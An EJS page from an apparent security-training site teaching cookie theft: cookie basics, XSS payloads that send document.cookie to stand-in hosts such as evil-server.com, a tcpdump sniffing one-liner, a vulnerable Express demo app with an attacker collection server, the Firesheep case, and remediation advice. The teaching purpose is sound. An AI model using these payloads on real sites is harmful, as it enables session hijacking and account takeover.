@@ -1,0 +1,354 @@
+<%- include('partials/header') %>
+
+<section class="hero fade-in">
+  <span class="hero__badge">Module 03</span>
+  <h1 class="hero__title">Cookie Stealing</h1>
+  <p class="hero__subtitle">Understanding cookies, how they're stolen, real-world case studies, XSS-based POC exploits, and complete remediation strategies.</p>
+</section>
+
+<div class="container fade-in">
+
+  <!-- What is a Cookie? -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 3.1</div>
+      <h2 class="section__title">What is a Cookie?</h2>
+    </div>
+    <div class="section__content">
+      <p>An <strong>HTTP cookie</strong> (also called a web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser stores it and sends it back with subsequent requests to the same server. Cookies were invented by Lou Montulli at Netscape in 1994.</p>
+      <p>Cookies serve three primary purposes:</p>
+      <ul>
+        <li><strong>Session Management:</strong> Logins, shopping carts, game scores — anything the server should remember</li>
+        <li><strong>Personalization:</strong> User preferences, themes, language settings</li>
+        <li><strong>Tracking:</strong> Recording and analyzing user behavior for analytics and advertising</li>
+      </ul>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">HTTP — Cookie Lifecycle</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code># 1. Server sets a cookie in the response
+HTTP/1.1 200 OK
+Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
+
+# 2. Browser automatically sends it with every subsequent request to this domain
+GET /dashboard HTTP/1.1
+Cookie: session_id=abc123xyz
+
+# 3. Server reads the cookie to identify the session
+app.get('/dashboard', (req, res) => {
+  const sessionId = req.cookies.session_id;  // "abc123xyz"
+  const user = sessions[sessionId];           // Lookup session data
+});</code></pre>
+    </div>
+  </div>
+
+  <!-- Cookie Attributes -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 3.2</div>
+      <h2 class="section__title">Cookie Security Attributes</h2>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Attribute</th>
+            <th>Purpose</th>
+            <th>Security Impact</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>HttpOnly</code></td>
+            <td>Prevents JavaScript access (<code>document.cookie</code>)</td>
+            <td>🛡️ Blocks XSS cookie theft — <strong>critical</strong></td>
+          </tr>
+          <tr>
+            <td><code>Secure</code></td>
+            <td>Only sent over HTTPS connections</td>
+            <td>🛡️ Prevents interception on HTTP — blocks sidejacking</td>
+          </tr>
+          <tr>
+            <td><code>SameSite=Strict</code></td>
+            <td>Never sent in cross-site requests</td>
+            <td>🛡️ Prevents CSRF attacks completely</td>
+          </tr>
+          <tr>
+            <td><code>SameSite=Lax</code></td>
+            <td>Sent on top-level navigations only</td>
+            <td>🛡️ Good CSRF protection with usability balance</td>
+          </tr>
+          <tr>
+            <td><code>SameSite=None</code></td>
+            <td>Sent on all cross-site requests</td>
+            <td>⚠️ Must use with Secure; enables cross-site embedding</td>
+          </tr>
+          <tr>
+            <td><code>Domain</code></td>
+            <td>Restricts which domains receive the cookie</td>
+            <td>🛡️ Prevents cookie leakage to subdomains</td>
+          </tr>
+          <tr>
+            <td><code>Path</code></td>
+            <td>Restricts which URL paths send the cookie</td>
+            <td>Mild protection — not a security boundary</td>
+          </tr>
+          <tr>
+            <td><code>Max-Age / Expires</code></td>
+            <td>Cookie lifetime</td>
+            <td>🛡️ Shorter = less time for stolen cookies to be useful</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- How Cookies Are Stolen -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 3.3</div>
+      <h2 class="section__title">How Cookies Are Stolen</h2>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 Attack Vector 1: Cross-Site Scripting (XSS)</div>
+      <div class="info-box__content">
+        <p>If a website is vulnerable to XSS and cookies don't have the <code>HttpOnly</code> flag, an attacker can inject JavaScript that reads <code>document.cookie</code> and exfiltrates it to their server.</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">JavaScript — XSS Cookie Theft</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code>// Attacker finds a reflected XSS vulnerability in a search page
+// Crafted malicious URL:
+https://vulnerable-site.com/search?q=<script>
+  // Read all cookies accessible to JavaScript
+  var cookies = document.cookie;
+
+  // Send them to attacker's server
+  new Image().src = "https://evil-server.com/steal?c=" + encodeURIComponent(cookies);
+
+  // Alternative: Using fetch
+  fetch("https://evil-server.com/steal", {
+    method: "POST",
+    body: JSON.stringify({ cookies: document.cookie }),
+    mode: "no-cors"
+  });
+</script>
+
+// Attacker's server logs:
+// GET /steal?c=session_id=abc123xyz;user_prefs=dark_mode
+// → Attacker now has the victim's session cookie!
+// → They set it in their browser and are logged in as victim 💀</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 Attack Vector 2: Man-in-the-Middle (MITM)</div>
+      <div class="info-box__content">
+        <p>On unencrypted HTTP connections, anyone on the same network can sniff cookie values from network traffic using tools like Wireshark, tcpdump, or Ettercap.</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">Bash — Network Sniffing</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code># Attacker on same WiFi network uses tcpdump
+sudo tcpdump -i wlan0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i "Cookie:"
+
+# Output:
+Cookie: session_id=abc123xyz; username=victim
+# → Attacker captures session cookie from unencrypted HTTP traffic 💀
+
+# Or using Wireshark:
+# Filter: http.cookie contains "session"
+# → Displays all cookies in captured traffic</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 Attack Vector 3: Session Sidejacking (WiFi)</div>
+      <div class="info-box__content">
+        <p>A specific form of MITM attack on public WiFi networks where the attacker sniffs session cookies that aren't protected by HTTPS.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Real Case: Firesheep -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 3.4</div>
+      <h2 class="section__title">Real Case Study: Firesheep (2010)</h2>
+    </div>
+    <div class="section__content">
+
+      <div class="info-box info-box--example">
+        <div class="info-box__title">🟣 The Firesheep Incident</div>
+        <div class="info-box__content">
+          <p><strong>What:</strong> Firesheep was a Firefox extension created by Eric Butler, released at ToorCon 12 in October 2010. It automated session sidejacking — sniffing session cookies on open WiFi networks.</p>
+          <p><strong>How it worked:</strong></p>
+          <ul>
+            <li>Installed as a simple Firefox extension — no technical skill required</li>
+            <li>Monitored WiFi traffic for session cookies from Facebook, Twitter, Amazon, etc.</li>
+            <li>Displayed a sidebar showing all hijackable sessions on the network</li>
+            <li>One click → impersonate any user on the network</li>
+          </ul>
+          <p><strong>Why it was possible:</strong> In 2010, Facebook, Twitter, and many major sites only used HTTPS for the login page but served all subsequent pages over HTTP. Session cookies were transmitted in plaintext.</p>
+          <p><strong>Impact:</strong></p>
+          <ul>
+            <li>Downloaded over <strong>1 million times</strong> in the first 24 hours</li>
+            <li>Forced Facebook, Twitter, and Google to implement full-site HTTPS</li>
+            <li>Accelerated the "HTTPS Everywhere" movement</li>
+            <li>Led to the creation of Let's Encrypt (free HTTPS certificates)</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Dummy POC -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 3.5</div>
+      <h2 class="section__title">POC: Dummy Cookie Theft Example</h2>
+    </div>
+
+    <div class="info-box info-box--warning">
+      <div class="info-box__title">⚠️ Educational Purpose Only</div>
+      <div class="info-box__content">This is a demonstration in a controlled environment. Never use against real systems without explicit authorization.</div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">JavaScript — Vulnerable App (server.js)</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code>const express = require('express');
+const app = express();
+
+// ❌ VULNERABLE: Cookie without HttpOnly
+app.get('/login', (req, res) => {
+  res.cookie('session_token', 'user_secret_session_abc123', {
+    // HttpOnly: false (DEFAULT — vulnerable!)
+    // Secure: false (DEFAULT — vulnerable!)
+    maxAge: 3600000
+  });
+  res.send('Logged in! Your session cookie is set.');
+});
+
+// ❌ VULNERABLE: Reflected XSS in search
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  // Directly injecting user input into HTML — XSS!
+  res.send(`&lt;h1&gt;Results for: ${query}&lt;/h1&gt;`);
+});</code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">JavaScript — Attacker's Server (evil-server.js)</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code>const express = require('express');
+const app = express();
+
+// Receives stolen cookies
+app.get('/steal', (req, res) => {
+  console.log('🔓 STOLEN COOKIE:', req.query.c);
+  // In real attack: save to database, alert attacker
+  res.status(200).end();
+});
+
+app.listen(4444, () => {
+  console.log('Evil server listening on port 4444');
+});
+
+// Attack URL sent to victim:
+// https://vulnerable-site.com/search?q=&lt;script&gt;new Image().src='http://localhost:4444/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">Bash — Attack Flow</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code># Step 1: Victim visits the vulnerable app and gets a session cookie
+GET /login → Set-Cookie: session_token=user_secret_session_abc123
+
+# Step 2: Attacker crafts malicious link and sends it to victim
+https://vulnerable-site.com/search?q=<script>new Image().src='http://evil.com:4444/steal?c='+document.cookie</script>
+
+# Step 3: Victim clicks the link — browser executes the injected script
+# → JavaScript reads document.cookie → sends to evil server
+
+# Step 4: Attacker's server receives:
+# 🔓 STOLEN COOKIE: session_token=user_secret_session_abc123
+
+# Step 5: Attacker sets the cookie in their own browser
+# → document.cookie = "session_token=user_secret_session_abc123"
+# → Now impersonating the victim! 💀</code></pre>
+    </div>
+  </div>
+
+  <!-- Remediation -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 3.6</div>
+      <h2 class="section__title">Complete Remediation Guide</h2>
+    </div>
+
+    <div class="info-box info-box--remediation">
+      <div class="info-box__title">✅ Cookie Security Checklist</div>
+      <div class="info-box__content">
+        <ul>
+          <li>✅ <strong>Set HttpOnly flag</strong> on all session/authentication cookies</li>
+          <li>✅ <strong>Set Secure flag</strong> to prevent transmission over HTTP</li>
+          <li>✅ <strong>Set SameSite=Strict or Lax</strong> to prevent CSRF</li>
+          <li>✅ <strong>Use HTTPS everywhere</strong> — force with HSTS header</li>
+          <li>✅ <strong>Sanitize all user input</strong> to prevent XSS (use DOMPurify, helmet)</li>
+          <li>✅ <strong>Set Content-Security-Policy</strong> header to prevent inline scripts</li>
+          <li>✅ <strong>Rotate session IDs</strong> after login and privilege escalation</li>
+          <li>✅ <strong>Use short expiration times</strong> — 30 min for sensitive sessions</li>
+          <li>✅ <strong>Bind sessions</strong> to user fingerprint (IP + User-Agent hash)</li>
+          <li>✅ <strong>Implement cookie prefixes</strong>: <code>__Host-</code> or <code>__Secure-</code></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block__header">
+        <span class="code-block__lang">JavaScript — Secure Cookie Configuration</span>
+        <button class="code-block__copy">Copy</button>
+      </div>
+      <pre><code>// ✅ SECURE: Properly configured session cookie
+res.cookie('__Host-session_id', sessionId, {
+  httpOnly: true,     // 🛡️ No JavaScript access
+  secure: true,       // 🛡️ HTTPS only
+  sameSite: 'strict', // 🛡️ No cross-site sending
+  maxAge: 1800000,    // 30 minutes
+  path: '/',
+  domain: undefined   // __Host- prefix requires no Domain
+});
+
+// ✅ SECURE: Express session with helmet
+const helmet = require('helmet');
+const session = require('express-session');
+
+app.use(helmet());  // Sets CSP, HSTS, X-Frame-Options, etc.
+app.use(session({
+  secret: crypto.randomBytes(32).toString('hex'),
+  resave: false,
+  saveUninitialized: false,
+  cookie: { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 1800000 }
+}));</code></pre>
+    </div>
+  </div>
+
+</div>
+
+<%- include('partials/footer') %>
